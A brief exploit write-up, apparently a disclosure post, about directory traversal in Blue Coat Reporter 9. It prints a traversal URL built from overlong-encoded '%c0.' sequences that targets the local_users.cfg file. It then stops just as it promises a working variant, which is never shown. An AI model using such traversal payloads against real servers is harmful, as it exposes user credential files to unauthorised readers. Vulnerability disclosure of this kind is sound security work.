According to Blue Coat's knowledge base (https://kb.bluecoat.com/index?page=content&id=FAQ372),
some of the common configuration files are located in:
Windows: <installed drive>/Program Files/Bluecoat Reporter 9/settings

If you try to get the configuration files in the way showed below, it will not work:
http://10.X.X.X:8081/%c0.%c0./%c0.%c0./%c0.%c0./Program%20Files/Bluecoat%20Reporter%209/settings/local_users.cfg

But, if you send the request in this another way ;), it works pretty well:
